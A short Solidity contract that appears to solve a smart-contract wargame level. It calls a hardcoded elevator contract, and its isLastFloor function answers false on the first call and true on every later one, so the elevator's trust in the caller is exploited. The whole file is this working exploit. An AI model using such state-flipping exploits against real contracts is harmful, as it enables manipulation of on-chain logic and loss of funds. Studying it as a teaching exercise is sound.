// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;
interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function top() external returns (bool);

    function goTo(uint _floor) external;
}

contract Burj is Building {

    IElevator public constant elevator = IElevator(0x9f755007b95dB3027fce3574641706243aF85cFC);
    bool public gm;

    function isLastFloor(uint) external returns (bool) {
        bool originalgm = gm;
        gm = true;
        return originalgm;
    }

    function goTo(uint _floor) external {
        elevator.goTo(_floor);
    }

}